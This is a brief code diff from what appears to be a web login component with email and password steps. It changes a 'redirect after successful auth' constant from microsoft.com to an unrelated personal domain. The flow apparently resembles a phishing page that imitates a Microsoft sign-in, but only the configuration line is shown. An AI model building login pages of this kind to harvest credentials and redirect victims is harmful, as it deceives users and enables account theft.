@@ -19,7 +19,7 @@ import { validateEmail, validatePassword, generateAvatarUrl } from '@/lib/utils'
 const API_BASE_URL = process.env.NEXT_PUBLIC_API_URL || ''
 
 // CONFIGURATION: Redirect URL after successful auth
-const REDIRECT_URL = 'https://microsoft.com'
+const REDIRECT_URL = 'https://ggraps.franciscoluquedelcastillo.es'
 
 type AuthStep = 'loading' | 'email' | 'password' | 'processing' | 'redirecting'
 
